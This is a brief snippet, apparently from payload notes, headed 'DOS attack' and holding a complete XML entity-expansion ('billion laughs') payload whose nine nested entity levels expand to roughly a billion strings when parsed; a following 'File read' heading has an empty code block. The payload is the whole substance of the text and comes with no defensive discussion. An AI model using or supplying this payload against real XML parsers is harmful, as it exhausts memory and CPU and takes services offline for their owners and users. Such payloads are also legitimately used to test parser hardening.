DOS attack:

```xml
<!--?xml version="1.0" ?--> <!DOCTYPE bombz [ <!ENTITY bomb "bomb"> <!ELEMENT bombz (#PCDATA)> <!ENTITY bomb1 "&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;"> <!ENTITY bomb2 "&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;"> <!ENTITY bomb3 "&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;"> <!ENTITY bomb4 "&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;"> <!ENTITY bomb5 "&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;"> <!ENTITY bomb6 "&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;"> <!ENTITY bomb7 "&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;"> <!ENTITY bomb8 "&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;"> <!ENTITY bomb9 "&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;"> ]> <bombz>&bomb9;</bombz> 

```

File read:

```xml

```